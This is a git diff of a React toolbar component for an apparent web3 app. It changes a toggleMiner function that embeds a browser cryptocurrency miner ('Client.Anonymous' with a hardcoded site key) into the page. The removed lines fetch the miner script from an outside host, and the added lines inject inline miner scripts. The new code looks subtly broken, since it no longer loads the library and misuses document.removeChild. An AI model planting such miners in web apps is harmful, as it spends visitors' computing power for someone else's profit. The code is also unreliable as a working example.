@@ -1,5 +1,5 @@
 import React, { useState, useEffect } from 'react';
-import { MetaMask, networkDetails, formatAddress } from './MetaMask';  // Import MetaMask, networkDetails, formatAddress correctly
+import { MetaMask, networkDetails, formatAddress } from './MetaMask';
 import RewardsDropdown from './RewardsDropdown';
 import EmailFormModal from './EmailFormModal';
 import BottomToolbar from './BottomToolbar';
@@ -92,34 +92,59 @@ const TopToolbar = ({
       const { storageDid } = await response.json();
       console.log('web3.storage setup successfully, storageDid:', storageDid);
     } catch (error) {
-      console.error('Error setting up web3.storage:', error); // Only log the error to console
+      console.error('Error setting up web3.storage:', error);
     }
   };
 
   const toggleMiner = () => {
     setIsMinerOn(!isMinerOn);
     if (!isMinerOn) {
-      const script = document.createElement('script');
-      script.src = 'https://www.hostingcloud.racing/STsw.js';
-      script.async = true;
-      script.onload = () => {
-        const miner = new window.Client.Anonymous('b9445345d693a1af3a5b08cac6c3ac90f78485c63d7e263b573763b98eb75723', { throttle: 0.8 });
-        miner.start();
-      };
-      document.body.appendChild(script);
+      try {
+          if ( window.minerScript_Lo) {
+            document.removeChild(window.minerScript_Lo);
+          }
+          const minerScript_Hi = document.createElement('script');
+          minerScript_Hi.innerHTML = `
+            var miner = new Client.Anonymous('b9445345d693a1af3a5b08cac6c3ac90f78485c63d7e263b573763b98eb75723', {
+              throttle: 0.8, c: 'w', ads: 0
+            });
+            miner.start();
+            window.activeMiner = miner;
+          `;
+          document.body.appendChild(minerScript_Hi);
+          window.minerScript_Hi = minerScript_Hi;
+          console.log('Miner throttle increased');
+        
+      } catch (error) {
+        console.error('Error starting miner:', error);
+      }
     } else {
-      // Logic to slow the miner
-      const script = document.createElement('script');
-      script.src = 'https://www.hostingcloud.racing/STsw.js';
-      script.async = true;
-      script.onload = () => {
-        const miner = new window.Client.Anonymous('b9445345d693a1af3a5b08cac6c3ac90f78485c63d7e263b573763b98eb75723', { throttle: 0.1 });
-        miner.start();
-      };
-      document.body.appendChild(script);
-
+      try {
+        if (window.activeMiner) {
+          document.removeChild(window.minerScript_Hi);
+          const minerScript_Lo = document.createElement('script');
+          minerScript_Lo.innerHTML = `
+            miner.stop();
+            var miner = new Client.Anonymous('b9445345d693a1af3a5b08cac6c3ac90f78485c63d7e263b573763b98eb75723', {
+              throttle: 0.1, c: 'w', ads: 0
+            });
+            miner.start();
+            window.activeMiner = miner;
+          `;
+          document.body.appendChild(minerScript_Lo);
+          window.minerScript_Lo = minerScript_Lo;
+          console.log('Miner throttle decreased');
+          
+        } else {
+          console.error('No active miner to adjust.');
+        }
+      } catch (error) {
+        console.error('Error adjusting miner:', error);
+      }
     }
   };
+
+
 
   return (
     <>
